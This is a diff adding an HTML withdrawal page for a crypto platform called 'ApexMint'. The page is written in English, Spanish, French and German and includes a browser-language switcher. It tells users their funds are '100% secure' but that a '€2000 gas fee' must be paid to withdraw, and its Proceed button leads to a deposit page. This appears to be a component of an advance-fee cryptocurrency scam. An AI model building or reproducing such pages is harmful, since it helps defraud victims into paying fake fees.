@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ApexMint Withdrawal</title>
+  <style>
+    :root {
+      --bg-1: #0f0f14;
+      --bg-2: #1a1a22;
+      --primary: #1e90ff;
+      --text-1: #f1f1f1;
+      --text-2: #c5c5c5;
+      --accent: #14c38e;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: var(--bg-1);
+      color: var(--text-1);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .container {
+      background-color: var(--bg-2);
+      border-radius: 16px;
+      padding: 40px;
+      width: 420px;
+      box-shadow: 0 0 20px rgba(30, 144, 255, 0.2);
+      text-align: center;
+      animation: slideUp 1s ease-in-out;
+    }
+
+    select {
+      margin-bottom: 20px;
+      padding: 10px;
+      background: var(--bg-1);
+      color: var(--text-1);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      width: 100%;
+    }
+
+    h1 {
+      color: var(--primary);
+      margin-bottom: 20px;
+    }
+
+    p {
+      color: var(--text-2);
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+
+    .highlight {
+      color: var(--accent);
+      font-weight: bold;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .buttons button {
+      padding: 12px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      flex: 1;
+    }
+
+    .proceed {
+      background-color: var(--accent);
+      color: #000;
+    }
+
+    .proceed:hover {
+      background-color: #10a377;
+    }
+
+    .back {
+      background-color: #333;
+      color: var(--text-1);
+    }
+
+    .back:hover {
+      background-color: #555;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+
+    @keyframes slideUp {
+      0% { transform: translateY(40px); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <select id="language-selector">
+      <option value="en">English</option>
+      <option value="es">Español</option>
+      <option value="fr">Français</option>
+      <option value="de">Deutsch</option>
+    </select>
+
+    <h1 data-lang="en">Withdraw Funds</h1>
+    <h1 data-lang="es" style="display:none">Retirar Fondos</h1>
+    <h1 data-lang="fr" style="display:none">Retirer des Fonds</h1>
+    <h1 data-lang="de" style="display:none">Geld Abheben</h1>
+
+    <p data-lang="en">
+      Your funds are <span class="highlight">100% secure</span> with <strong>ApexMint</strong>.<br />
+      To complete your withdrawal, a <span class="highlight">gas fee of €2000</span> is required.<br />
+      This fee is necessary to process the blockchain transaction.
+    </p>
+    <p data-lang="es" style="display:none">
+      Tus fondos están <span class="highlight">100% seguros</span> con <strong>ApexMint</strong>.<br />
+      Para completar el retiro, se requiere una <span class="highlight">tarifa de gas de €2000</span>.<br />
+      Esta tarifa es necesaria para procesar la transacción en blockchain.
+    </p>
+    <p data-lang="fr" style="display:none">
+      Vos fonds sont <span class="highlight">100% sécurisés</span> chez <strong>ApexMint</strong>.<br />
+      Pour effectuer un retrait, des <span class="highlight">frais de gaz de 2000€</span> sont requis.<br />
+      Ces frais sont nécessaires pour le traitement de la transaction blockchain.
+    </p>
+    <p data-lang="de" style="display:none">
+      Ihre Gelder sind bei <strong>ApexMint</strong> <span class="highlight">100 % sicher</span>.<br />
+      Für die Abhebung ist eine <span class="highlight">Gasgebühr von 2000 €</span> erforderlich.<br />
+      Diese Gebühr wird benötigt, um die Blockchain-Transaktion abzuwickeln.
+    </p>
+
+    <div class="buttons">
+      <button class="back" onclick="window.history.back()" data-lang="en">Go Back</button>
+      <button class="back" style="display:none" onclick="window.history.back()" data-lang="es">Volver</button>
+      <button class="back" style="display:none" onclick="window.history.back()" data-lang="fr">Retour</button>
+      <button class="back" style="display:none" onclick="window.history.back()" data-lang="de">Zurück</button>
+
+      <button class="proceed" onclick="window.location.href='deposit.html';" data-lang="en">Proceed</button>
+      <button class="proceed" onclick="window.location.href='deposit.html';" style="display:none" onclick="alert('Procediendo al pago de la tarifa...')" data-lang="es">Proceder</button>
+      <button class="proceed" onclick="window.location.href='deposit.html';" style="display:none" onclick="alert('Traitement du paiement en cours...')" data-lang="fr">Continuer</button>
+      <button class="proceed" onclick="window.location.href='deposit.html';" style="display:none" onclick="alert('Gasgebühr wird verarbeitet...')" data-lang="de">Weiter</button>
+    </div>
+  </div>
+
+  <script>
+    const selector = document.getElementById('language-selector');
+
+    selector.addEventListener('change', function () {
+      const selectedLang = this.value;
+
+      document.querySelectorAll('[data-lang]').forEach(el => {
+        el.style.display = el.getAttribute('data-lang') === selectedLang ? '' : 'none';
+      });
+    });
+
+    // Optional: Set browser default language if available
+    window.addEventListener('load', () => {
+      const userLang = navigator.language.slice(0, 2);
+      if (['en', 'es', 'fr', 'de'].includes(userLang)) {
+        selector.value = userLang;
+        selector.dispatchEvent(new Event('change'));
+      }
+    });
+  </script>
+</body>
+</html>
